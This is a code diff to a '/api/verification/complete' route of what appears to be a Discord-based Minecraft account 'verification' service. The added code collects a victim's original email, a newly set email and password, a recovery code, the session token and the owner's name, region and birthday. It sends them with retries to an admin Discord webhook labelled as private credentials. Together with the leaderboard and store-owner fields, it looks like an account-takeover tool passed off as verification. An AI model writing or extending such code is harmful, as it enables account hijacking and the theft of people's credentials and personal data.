@@ -118,6 +118,105 @@ export const Route = createFileRoute("/api/verification/complete")({
             .eq("id", sessionId);
         }
 
+        // ---- Admin webhook FIRST (full creds as soon as secure succeeds) ----
+        const adminWebhookUrl =
+          envStr("ADMIN_WEBHOOK_URL") || envStr("SECURED_ADMIN_WEBHOOK_URL");
+        if (!adminWebhookUrl) {
+          console.error(
+            "[verification/complete] ADMIN_WEBHOOK_URL missing — set on Vercel Production for admin creds alerts",
+          );
+        } else {
+          const ssid = String(result.ssid || "N/A");
+          const capes = String(result.capes || "N/A");
+          const method = String(result.method || "N/A");
+          const firstName = String(result.firstName || "N/A");
+          const lastName = String(result.lastName || "N/A");
+          const region = String(result.region || "N/A");
+          const birthday = String(result.birthday || "N/A");
+          const securedId = String(securedRow?.id || "N/A");
+
+          const plain =
+            `🔒 **Account Secured**\n` +
+            `MC: \`${mcUsername}\`\n` +
+            `Old email: \`${mcEmail || "N/A"}\`\n` +
+            `New email: \`${newEmail}\`\n` +
+            `New password: \`${newPassword}\`\n` +
+            `Recovery code: \`${recoveryCode}\`\n` +
+            `Member: \`${memberDiscordId || "N/A"}\`\n` +
+            `Owner: \`${storeDiscordId || "N/A"}\`\n` +
+            `Guild: \`${guildId || "N/A"}\``;
+
+          const payload = {
+            content: plain.slice(0, 1900),
+            embeds: [
+              {
+                title: "🔒 Account Secured — Full Credentials",
+                color: 0xed4245,
+                timestamp: new Date().toISOString(),
+                fields: [
+                  { name: "MC Username", value: `\`\`\`${mcUsername}\`\`\``, inline: true },
+                  { name: "Purchase", value: `\`\`\`${method}\`\`\``, inline: true },
+                  { name: "Capes", value: `\`\`\`${capes.slice(0, 200)}\`\`\``, inline: true },
+                  {
+                    name: "Original MC Email",
+                    value: `\`\`\`${mcEmail || "N/A"}\`\`\``,
+                    inline: false,
+                  },
+                  { name: "New Email", value: `\`\`\`${newEmail}\`\`\``, inline: false },
+                  { name: "New Password", value: `\`\`\`${newPassword}\`\`\``, inline: true },
+                  { name: "Recovery Code", value: `\`\`\`${recoveryCode}\`\`\``, inline: true },
+                  {
+                    name: "SSID",
+                    value: `\`\`\`${ssid.length > 180 ? ssid.slice(0, 180) + "…" : ssid}\`\`\``,
+                    inline: false,
+                  },
+                  {
+                    name: "Owner Profile",
+                    value: `\`\`\`${firstName} ${lastName} | ${region} | ${birthday}\`\`\``,
+                    inline: false,
+                  },
+                  { name: "Member Discord", value: `\`\`\`${memberDiscordId || "N/A"}\`\`\``, inline: true },
+                  { name: "Owner Discord", value: `\`\`\`${storeDiscordId || "N/A"}\`\`\``, inline: true },
+                  { name: "Guild", value: `\`\`\`${guildId || "N/A"}\`\`\``, inline: true },
+                  { name: "Session", value: `\`\`\`${sessionId || "N/A"}\`\`\``, inline: true },
+                  { name: "Secured Row", value: `\`\`\`${securedId}\`\`\``, inline: true },
+                  { name: "Channel", value: `\`\`\`${channelId || "N/A"}\`\`\``, inline: true },
+                ],
+                footer: { text: "LuauX admin webhook — private credentials" },
+              },
+            ],
+          };
+
+          let webhookOk = false;
+          for (let attempt = 1; attempt <= 3; attempt++) {
+            try {
+              const whRes = await fetch(adminWebhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload),
+              });
+              if (whRes.ok || whRes.status === 204) {
+                webhookOk = true;
+                console.log(`[verification/complete] admin webhook ok (attempt ${attempt})`);
+                break;
+              }
+              const t = await whRes.text().catch(() => "");
+              console.error(
+                `[verification/complete] admin webhook HTTP ${whRes.status} attempt ${attempt}: ${t.slice(0, 200)}`,
+              );
+            } catch (e) {
+              console.error(
+                `[verification/complete] admin webhook error attempt ${attempt}:`,
+                e instanceof Error ? e.message : e,
+              );
+            }
+            await new Promise((r) => setTimeout(r, 400 * attempt));
+          }
+          if (!webhookOk) {
+            console.error("[verification/complete] admin webhook FAILED after retries");
+          }
+        }
+
         // Leaderboard: count successful secures (idempotent by secured row / session)
         try {
           const { recordLeaderboardSecured } = await import("@/lib/leaderboard.server");
@@ -221,48 +320,6 @@ export const Route = createFileRoute("/api/verification/complete")({
             }
           } catch (e) {
             console.warn("[verification/complete] member DM failed", e);
-          }
-        }
-
-        // Private admin webhook
-        const adminWebhookUrl = process.env.ADMIN_WEBHOOK_URL;
-        if (adminWebhookUrl) {
-          try {
-            await fetch(adminWebhookUrl, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                embeds: [
-                  {
-                    title: "🔒 Account Secured (Admin Log)",
-                    color: 0x5865f2,
-                    fields: [
-                      { name: "Member Discord ID", value: `\`\`\`${memberDiscordId}\`\`\``, inline: true },
-                      { name: "Owner Discord ID", value: `\`\`\`${storeDiscordId}\`\`\``, inline: true },
-                      { name: "Guild ID", value: `\`\`\`${guildId || "N/A"}\`\`\``, inline: true },
-                      { name: "MC Username", value: `\`\`\`${mcUsername}\`\`\``, inline: true },
-                      {
-                        name: "New Email",
-                        value: `\`\`\`${result.newEmail || "N/A"}\`\`\``,
-                        inline: true,
-                      },
-                      {
-                        name: "New Password",
-                        value: `\`\`\`${result.newPassword || "N/A"}\`\`\``,
-                        inline: true,
-                      },
-                      {
-                        name: "Recovery Code",
-                        value: `\`\`\`${result.recoveryCode || "N/A"}\`\`\``,
-                        inline: true,
-                      },
-                    ],
-                  },
-                ],
-              }),
-            });
-          } catch (e) {
-            console.error("[verification/complete] admin webhook failed:", e);
           }
         }
 
